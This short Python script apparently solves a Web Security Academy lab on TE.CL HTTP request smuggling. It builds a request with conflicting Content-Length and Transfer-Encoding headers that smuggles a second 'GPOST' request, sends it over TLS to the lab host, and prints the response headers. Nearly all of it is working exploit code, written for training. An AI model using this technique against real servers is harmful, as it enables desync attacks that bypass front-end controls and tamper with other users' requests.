import socket, ssl, requests
'''
    - TE.CL occurse when the front end honors the Transfer-Encoding header and the backend honors the Content-Length header.

    --- requestA -----------------
    POST / HTTP/1.1\r\n
    Host: 0a81002e0347972280f84f27002000e9.web-security-academy.net\r\n
    Content-Length: 4\r\n
    Transfer-Encoding: chunked\r\n
    \r\n
    57\r\n
    GPOST /meow HTTP/1.1\r\n
    Host: 0a81002e0347972280f84f27002000e9.web-security-academy.net\r\n
    \r\n
    0\r\n
    \r\n
    --- /requestA -----------------
'''

host = '0a81002e0347972280f84f27002000e9.web-security-academy.net'
port = '443'

context = ssl.create_default_context()


# smugled request ---------------------------------------
smuggled_req = f'''GPOST /meow HTTP/1.1\r
Host: {host}\r
Content-Length: 0\r
'''
len_smuggled = hex(len(smuggled_req))[2:]
second_req = f'''{smuggled_req}'''
# /smugled request ---------------------------------------


# main request ---------------------------------------
req = f'''POST / HTTP/1.1\r
Host: {host}\r
Content-Length: {len(len_smuggled)+2}\r
Transfer-Encoding: chunked\r
\r
{len_smuggled}\r
{smuggled_req}\r
0\r
\r
'''
# /main request ---------------------------------------


# print request to terminal
print(f'-------------------------')
print(f'{req}')
print(f'-------------------------')
req = req.encode()
print(f'{req=}')

# send requestA / get response
print('sending requestA...')
with socket.create_connection((host, port)) as s:
    with context.wrap_socket(s, server_hostname=host) as secure_s:
        secure_s.sendall(req)
        resp = b''
        while True:
            data = secure_s.recv(4096)
            if not data: break
            resp += data

# print response
resp = resp.decode()
resp = resp.split('\r\n')
empty_index = resp.index('')
for i in range(empty_index+1):
    print(resp[i])